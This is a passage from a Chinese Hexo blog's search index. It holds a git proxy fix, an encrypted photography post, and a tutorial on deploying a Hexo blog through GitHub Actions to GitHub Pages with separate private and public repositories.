href="https://github.com/pacemrc/JavaSec.git/">https://github.com/pacemrc/JavaSec.git/</a>‘: Failed to connect to <a href="http://github.com/">github.com</a> port 443 after 21039 ms: Timed out</p><p><strong>解决</strong></p><div class="code-wrapper"><pre><code class="hljs tcl"><span class="hljs-comment">#配置代理</span>git config --<span class="hljs-keyword">global</span> <span class="hljs-keyword">http</span>.proxy <span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">7890</span>git config --<span class="hljs-keyword">global</span> <span class="hljs-keyword">http</span>.proxy <span class="hljs-keyword">http</span>://proxy.lfk.qianxin-inc.cn:<span class="hljs-number">3128</span><span class="hljs-comment">#取消代理</span>git config --<span class="hljs-keyword">unset</span> <span class="hljs-keyword">http</span>.proxy</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>问题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>摄影笔记</title>
    <link href="/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E6%91%84%E5%BD%B1%E7%AC%94%E8%AE%B0/"/>
    <url>/%E6%91%84%E5%BD%B1%E6%95%99%E7%A8%8B/%E6%91%84%E5%BD%B1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="15dbb54577921f72f7cc783295d1d0ba8fdd2a307e8778f6ac5a5f7e07671f2b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>摄影教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Photograph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于Hexo+Github Actions方案搭建Github博客</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/github-blog/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/github-blog/</url>
    
    <content type="html"><![CDATA[<h1 id="部署方案"><a href="#部署方案" class="headerlink" title="部署方案"></a>部署方案</h1><ol><li><strong>纯静态网页文件部署</strong></li></ol><p>创建一个公开网页仓库，仅将网站的静态网页文件上传到该仓库。</p><p>优点：搭建快速，安全，网站源码他人不可见。缺点：网站源码在本地，不易维护。</p><ol start="2"><li><strong>网站源码和静态网页文件同一仓库部署</strong></li></ol><p>创建一个公开网页仓库，将网站的Hexo源码和静态网页文件上传到Github该仓库。</p><p>优点：网站源码易维护，不易丢失；缺点：网站仓库需为公开状态，其他人可直接访问到网站源码，不安全。</p><ol start="3"><li><strong>网站源码和静态网页文件仓库分离部署</strong></li></ol><p>分别创建一个公开网页仓库和私有源码仓库，公开网页仓库存放网站静态文件，私有源码仓库存放网站源码。</p><p>优点：网站易维护，安全性高。</p><p><strong>本文讨论的是第三种部署方案。</strong></p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p>使用hexo在本地创建一个网站目录，网站文章的创建编写等操作均在本地。文章创作完成后，使用git创建为本地仓库，使用git将网页源代码文件提交到远程私有源码仓库，私有源码仓库配置了Github Actions工作流，当监听到有代码提交操作时会自动触发工作流将网站源代码编译生成网页静态文件，之后私有源码仓库将静态网页文件提交到公开网页仓库，公开网页仓库使用了Github Pages技术当监听到代码提交时会自动将静态网页文件部署到内部web容器中，最后可通过域名访问。</p><h1 id="部署过程"><a href="#部署过程" class="headerlink" title="部署过程"></a>部署过程</h1><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><p>安装Git、Node.js、Hexo。参考：<a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><h2 id="生成访问Token"><a href="#生成访问Token" class="headerlink" title="生成访问Token"></a>生成访问Token</h2><p>Github远程仓库的访问需要进行身份认证，认证的方式有<code>Person access token</code>、<code>SSH keys</code>等。此处使用token方式进行仓库的权限认证。在<code>Settings--&gt;Developer Settings--&gt;Personal access tokens--&gt;Token（classic）</code>中生成一个token。该Token用于私有源码仓库的工作流中定义的yml脚本环境访问公开网页仓库。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105105819549.png"> </p><p>设置Token名称，有效期选择<code>No expiration</code>，权限范围选择<code>repo</code>和<code>workflow</code>即可，最后点击生成token。<strong>生成的token仅出现一次，后续无法查看，需保存下来。</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105105449586.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105105736682.png"> </p><h2 id="创建私有源码仓库"><a href="#创建私有源码仓库" class="headerlink" title="创建私有源码仓库"></a>创建私有源码仓库</h2><p>创建一个仓库存放网站源代码，可视性设置<code>Private</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105103949710.png"> </p><p><strong>配置隐私变量</strong></p><p>在私有源码仓库的<code>Settings--&gt;Secrets and variables--&gt;Actions</code>中，设置Name为<code>DEPLOY_TOKEN</code>，Secret设置生成的token值。该变量会在工作流的yml文件中引用。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105163235999.png"></p><h2 id="创建公开网站仓库"><a href="#创建公开网站仓库" class="headerlink" title="创建公开网站仓库"></a>创建公开网站仓库</h2><p>创建网站仓库，仓库名格式为<code>username.github.io</code>，公开性设置为<code>Public</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105104800604.png"> </p><h2 id="创建本地网站"><a href="#创建本地网站" class="headerlink" title="创建本地网站"></a>创建本地网站</h2><h2 id="创建Hexo项目"><a href="#创建Hexo项目" class="headerlink" title="创建Hexo项目"></a>创建Hexo项目</h2><div class="code-wrapper"><pre><code class="hljs csharp">hexo <span class="hljs-keyword">init</span> blog</code></pre></div><p>执行该命令将在当前目录下创建一个<code>blog</code>文件夹，从<code> https://github.com/hexojs/hexo-starter.git</code>仓库拉取文件，并自动下载相关依赖包。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105110634717.png"> </p><blockquote><p>github将默认分支名已从master修改为main，安装git客户端时尽量选择重写主分支名，或者执行git branch -M master main将主分支名修改为main</p></blockquote><h2 id="创建文章"><a href="#创建文章" class="headerlink" title="创建文章"></a>创建文章</h2><p>hexo更多操作查看<a href="https://hexo.io/zh-cn/docs/commands">https://hexo.io/zh-cn/docs/commands</a> 本文更多演示博客搭建效果</p><div class="code-wrapper"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> beijing</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105110750573.png"> </p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p><strong>下载主题</strong></p><p>笔者使用的主题：<a href="https://github.com/fluid-dev/hexo-theme-fluid.git">https://github.com/fluid-dev/hexo-theme-fluid.git</a></p><div class="code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">-b</span> <span class="hljs-keyword">master</span> <span class="hljs-title">https</span>://github.com/fluid-dev/hexo-theme-fluid.git themes/fluid</code></pre></div><p> 执行命令将在themes文件夹下创建fluid文件夹<img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105111049466.png"> </p><p><strong>应用主题</strong></p><ol><li>修改网站目录下的<code>_config.yml</code>配置文件，将<code>theme</code>字段值修改为<code>theme: fluid</code></li></ol><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105111311362.png"> </p><ol start="2"><li>设置主题文件。在<code>themes/fluid</code>主题文件夹下，将<code>_config.yml</code>文件重命名为<code>_config.fluid.yml</code>并复制到网站主目录下。</li></ol><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105111630452.png"> </p><h2 id="创建Github-Actions工作流"><a href="#创建Github-Actions工作流" class="headerlink" title="创建Github Actions工作流"></a>创建Github Actions工作流</h2><p>在网站主目录<code>.github</code>文件夹下创建<code>workflows</code>文件夹，进入并创建一个<code>autodeploy.yml</code>文件，该文件定义了一些列动作，主要为当网站源码仓库监听到push操作后即自动生成静态网页文件并将静态文件推送到网站仓库。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105112255746.png"> </p><p>注意：</p><ol><li>自行替换pacemrc关键字</li><li>自行确认项目的主分支名称，本配置使用的是main，若为master需将main替换为master</li><li>文件中$的变量名为上述步骤中设置的变量名</li></ol><p><strong>autodeploy.yml</strong></p><div class="code-wrapper"><pre><code class="hljs nix"><span class="hljs-params">name:</span> AutoDeploy<span class="hljs-params">on:</span>  <span class="hljs-params">push:</span>    <span class="hljs-params">branches:</span>      <span class="hljs-operator">-</span> main  <span class="hljs-comment">#需确认分支名称</span>  <span class="hljs-params">release:</span>    <span class="hljs-params">types:</span>      <span class="hljs-operator">-</span> published<span class="hljs-params">jobs:</span>  <span class="hljs-params">deploy:</span>    <span class="hljs-params">runs-on:</span> ubuntu-latest    <span class="hljs-params">steps:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Checkout branch      <span class="hljs-params">uses:</span> actions<span class="hljs-operator">/</span>checkout@v3      <span class="hljs-params">with:</span>        <span class="hljs-params">ref:</span> main    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Install NodeJS      <span class="hljs-params">uses:</span> actions<span class="hljs-operator">/</span>setup-node@v3      <span class="hljs-params">with:</span>        <span class="hljs-params">node-version:</span> <span class="hljs-string">&quot;20.x&quot;</span>    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Install Hexo      <span class="hljs-params">run:</span> |        export TZ<span class="hljs-operator">=</span>&#x27;Asia<span class="hljs-operator">/</span>Shanghai&#x27;        npm install hexo-cli <span class="hljs-operator">-</span>g    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Cache Hexo      <span class="hljs-params">uses:</span> actions<span class="hljs-operator">/</span>cache@v3      <span class="hljs-params">id:</span> cache      <span class="hljs-params">with:</span>        <span class="hljs-params">path:</span> node_modules        <span class="hljs-params">key:</span> $&#123;&#123;runner.OS&#125;&#125;-$&#123;&#123;hashFiles(&#x27;<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span>package-lock.json&#x27;)&#125;&#125;    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Install Dependency      <span class="hljs-params">if:</span> steps.cache.outputs.cache-hit <span class="hljs-operator">!=</span> &#x27;<span class="hljs-literal">true</span>&#x27;      <span class="hljs-params">run:</span> |        npm install <span class="hljs-operator">-</span>-save    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Generate static files      <span class="hljs-params">run:</span> |        hexo clean        hexo generate    <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> Push static file to website repo      <span class="hljs-params">run:</span> |        cd <span class="hljs-symbol">./public</span>        git init        git config <span class="hljs-operator">-</span>-global user.name pacemrc        git config <span class="hljs-operator">-</span>-global user.email xxxxx@qq.com        git branch <span class="hljs-operator">-</span>M master main        git add .        git commit <span class="hljs-operator">-</span>m <span class="hljs-string">&quot;$(date +&quot;</span>%Z %Y-%m-%d %A %H:%M:%S<span class="hljs-string">&quot;) Updated By Github Actions&quot;</span>        git push <span class="hljs-operator">-</span>-force <span class="hljs-operator">-</span>-quiet <span class="hljs-string">&quot;https://pacemrc:<span class="hljs-subst">$&#123;&#123; secrets.DEPLOY_TOKEN &#125;</span>&#125;@github.com/pacemrc/pacemrc.github.io.git&quot;</span> main:main <span class="hljs-comment">#需确认分支名称</span></code></pre></div><h2 id="提交网站源码"><a href="#提交网站源码" class="headerlink" title="提交网站源码"></a>提交网站源码</h2><ol><li>删除主题文件夹<code>themes\fluid\</code>下的<code>.git</code>文件夹</li></ol><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105112920082.png"> </p><ol start="2"><li>将源码网站创建为Git仓库</li></ol><div class="code-wrapper"><pre><code class="hljs livecodeserver">git initgit <span class="hljs-built_in">add</span> <span class="hljs-comment">--all</span>git commit -<span class="hljs-keyword">a</span> -m <span class="hljs-string">&quot;first commit&quot;</span>git remote <span class="hljs-built_in">add</span> blog <span class="hljs-keyword">https</span>://github.com/pacemrc/blog.gitgit push -u blog main</code></pre></div><h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>当私有源码仓库监听到代码提交操作时，自动触发定义的工作流动作。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105113714822.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105113738199.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105115200458.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105115130428.png"> </p><p>同时公开网站仓库监听到代码提交操作时，也会自动触发预置的<code>pages-build-deployment</code>工作流操作。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105115755371.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105161453591.png"> </p><p>访问网站主页</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105120007499.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105120018408.png"> </p><p><strong>验证新提交文章操作</strong></p><p>创建新的文章并提交至远程网站源码仓库</p><div class="code-wrapper"><pre><code class="hljs livecodeserver">hexo <span class="hljs-built_in">new</span> shanghai   <span class="hljs-comment">#创建一个标题为shanghai的文章</span>git <span class="hljs-built_in">add</span> <span class="hljs-comment">--all</span>git commit -<span class="hljs-keyword">a</span> -m <span class="hljs-string">&quot;second commit&quot;</span>git push -u blog main</code></pre></div><p>私有源码仓库成功提交</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105120459990.png"> </p><p>公开网页仓库同步提交代码成功</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105120647501.png"></p><p>访问网站主页</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240105120709928.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><p><a href="https://isedu.top/index.php/archives/144/">https://isedu.top/index.php/archives/144/</a></p>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
